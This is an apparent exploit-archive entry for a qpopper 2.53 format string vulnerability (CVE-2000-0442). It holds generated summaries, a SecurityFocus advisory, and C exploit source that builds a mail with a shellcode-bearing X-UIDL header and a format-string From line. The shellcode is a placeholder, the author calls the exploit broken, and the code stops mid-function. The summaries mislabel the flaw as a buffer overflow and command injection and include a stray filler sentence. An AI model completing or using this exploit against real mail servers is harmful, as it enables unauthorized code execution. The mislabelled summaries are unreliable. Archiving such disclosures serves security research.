// #<-- Publish Date --># // 2000-05-24 // #<-- Technical Document Summary (TDS) --># // The vulnerability resides in qpopper version 2.53 and earlier, allowing an attacker to execute arbitrary code via a format string issue when processing the X-UIDL header field and mail headers. Exploitation requires a machine-executable payload placed in the X-UIDL header and a crafted "From:" line containing formatting strings. The flaw enables code execution with elevated privileges on hosts running qpopper, though it does not apply to versions after 2.53. This is a classic buffer overflow scenario where insufficient input validation leads to command injection. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // An attacker can inject malicious data into the X-UIDL header and mail headers to trigger a format string vulnerability, resulting in arbitrary code execution as the user running the mail spool process with group 'mail' permissions. This allows an attacker to run commands on the affected system without additional privileges. // #<-- Key Words (KW) --># // qpopper, version 2.53, Buffer0verflow, format string, X-UIDL header, mail headers, shellcode injection, arbitrary code execution, buffer overflow, CVE-2000-0442 // #<-- Related Terms --># // format string vulnerability, buffer overflow, privilege escalation, qpopper, security focus, CVE-2000-0442, mail spool, exploitation technique // #<-- Entities/Attributes --># // Product: qpopper (versions 2.53 and prior) // Vulnerability source: Security Focus // Author: Prizm // Platform: Linux // File: main.c // Functions: printf, sscanf, exit // Headers: X-UIDL, From // #<-- Vulnerability Type --># // Buffer overflow leading to arbitrary code execution // #<-- Original Content --># // source: https://www.securityfocus.com/bid/1242/info A vulnerability exists in version 2.53 and prior of qpopper, a popular POP server, from Qualcomm. By placing machine executable code in the X-UIDL header field, supplying formatting strings in the "From:" field in a mail header, and then issuing, as the user the mail was sent to, a 'euidl' command, it is possible to execute arbitrary code. This code will execute as the user executing the euidl command, but with group 'mail' permissions on hosts running qpopper in that group. This is often done due to mail spool permissions. This vulnerability does not exist in versions after 2.53. It also requires an account on the machine. /* qpop_euidl.c exploit by prizm/Buffer0verflow Security * * Sample exploit for buffer overflow in Qpopper 2.53. * This little proggie generates a mail u need to send. * * Standard disclaimer applies. * By the way, exploit is broken =) You need to insert shellcode. * * MAD greets to tf8 for pointing out the bug, and all other b0f members. * greets to USSRLabs and ADM * check http://b0f.freebsd.lublin.pl/ for news. */ #include <stdio.h> #include <string.h> char shellcode[]="imnothing"; int main(int argc, char *argv[]) { int i; unsigned long ra=0; if(argc!=2) { fprintf(stderr,"Usage: %s return_addr
", argv[0]); exit(0); } sscanf(argv[1], "%x", &ra); if(!ra) return; if(sizeof(shellcode) < 12 || sizeof(shellcode) > 76) { fprintf(stderr,"Bad shellcode
"); exit(0); } fprintf(stderr,"return address: 0x%.8x
", ra); printf("X-UIDL: "); for(i=0; i < sizeof(shellcode);i++) printf("%c", shellcode[i]); printf("
"); printf("From: %s", "%.1000d");

